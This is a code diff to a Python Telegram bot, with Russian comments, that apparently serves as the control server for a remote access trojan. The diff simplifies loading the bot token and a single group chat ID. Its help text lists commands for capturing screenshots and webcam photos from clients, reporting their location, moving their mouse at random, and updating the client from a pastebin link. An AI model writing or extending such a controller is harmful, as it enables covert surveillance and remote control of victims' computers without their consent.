@@ -17,47 +17,31 @@ logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(m
                     handlers=[logging.StreamHandler(), logging.FileHandler('server.log', encoding='utf-8')])
 logger = logging.getLogger(__name__)
 
-
 DATA = {}
 
 # Чтение файла 'data_info.txt'
 try:
     with open('data_info.txt', 'r', encoding='utf-8') as file:
         for line in file:
-            # Очистка строки от пробелов и символов переноса
             line = line.strip()
             
-            # Если в строке есть '=', обрабатываем ее
             if '=' in line:
                 key, value = line.split('=', 1)
                 DATA[key.strip()] = value.strip()
 
 except FileNotFoundError:
     logger.error("Критическая ошибка: Файл 'data_info.txt' не найден. Проверьте путь.")
-    # exit()
 
 # Присвоение считанных значений переменным
 try:
     TOKEN = DATA['TOKEN']
-    ids_string = DATA['GROUP_CHAT_IDS']
-    
-    # 1. Разбиваем строку по запятой, удаляем пробелы (strip()) и отфильтровываем пустые элементы.
-    # Это работает как для одного ID (разбивается на один элемент), так и для нескольких.
-    id_list_str = [id_str.strip() for id_str in ids_string.split(',') if id_str.strip()]
-    
-    # 2. Преобразуем список строк в список целых чисел (int)
-    GROUP_CHAT_IDS = [int(id_str) for id_str in id_list_str]
-    # ----------------------------------------------------
-    
-    logger.info("Данные успешно загружены из data_info.txt.")
-    
-    if not GROUP_CHAT_IDS:
-        logger.info("Внимание: В файле 'GROUP_CHAT_IDS' не указаны корректные ID.")
-except KeyError as e:
-    logger.error(f"Ошибка: Ключ {e} не найден в файле 'data_info.txt'. Убедитесь, что используются ключи 'TOKEN' и 'GROUP_CHAT_IDS'.")
-except ValueError:
-    logger.error("Ошибка: Одно или несколько значений в 'GROUP_CHAT_IDS' не являются корректными целыми числами.")
+    GROUP_CHAT_ID = int(DATA['GROUP_CHAT_ID']) 
 
+except KeyError as e:
+    logger.error(f"Ошибка: Ключ {e} не найден в файле 'data_info.txt'.")
+except ValueError:
+    # Эта ошибка сработает, если значение не является числом
+    logger.error("Ошибка: GROUP_CHAT_ID должен быть корректным целым числом.")
 
 bot = Bot(TOKEN)
 dp = Dispatcher()
@@ -75,7 +59,7 @@ BOT_USERNAME = ""
 
 class IsInGroup(BaseFilter):
     async def __call__(self, message: Message) -> bool:
-        return message.chat.id in GROUP_CHAT_IDS
+        return message.chat.id == GROUP_CHAT_ID
 
 def is_valid_filename(filename):
     invalid = '<>:"/\\|?*'
@@ -553,7 +537,7 @@ async def handle_help(message: Message):
 <b>👾 Автоматизация</b>
 <code>/mousemesstart</code> — включить случайное движение мыши
 <code>/mousemesstop</code> — остановить хаос мыши
-<code>/auto &lt;сек&gt; [screen|webcam|both]</code> — авто-отправка скриншотов/фото
+<code>/auto &lt;сек&gt; [screen|webcam|both] [инд. камеры]</code> — авто-отправка скриншотов/фото
 <code>/stop</code> — остановить <code>/auto</code>
 
 <b>🔇 Мультимедиа</b>
@@ -572,6 +556,7 @@ async def handle_help(message: Message):
 <code>/location</code> — отправка местоположения(страна, город и т.д) клиента
 <code>/update [pastebin raw]</code> - обновить версию на стороне клиента
 <code>/clients</code> - посмотреть активных клиентов и их историю
+<code>/version</code> - посмотреть версию ПО на стороне клиента
 
     <i>ver beta v16</i>"""
     await message.reply(help_text, parse_mode="HTML")
